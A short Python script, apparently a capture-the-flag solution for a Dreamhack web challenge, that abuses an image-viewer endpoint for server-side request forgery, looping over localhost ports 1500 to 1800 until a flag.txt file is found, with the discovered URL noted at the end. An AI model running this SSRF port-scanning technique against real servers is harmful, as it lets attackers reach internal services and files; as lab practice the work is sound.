import requests

no = 'iVBORw0KGg'
for port in range(1500, 1801):
    url = 'http://host3.dreamhack.games:10795/img_viewer'
    image_url= 'http://Localhost:'+str(port)+'/flag.txt'
    data = { "url" : image_url }
    response = requests.post(url, data).text
    if no in response:
        print(str(port))
    else:
        print(str(port), 'find')
        break

    http://Localhost:1669/flag.txt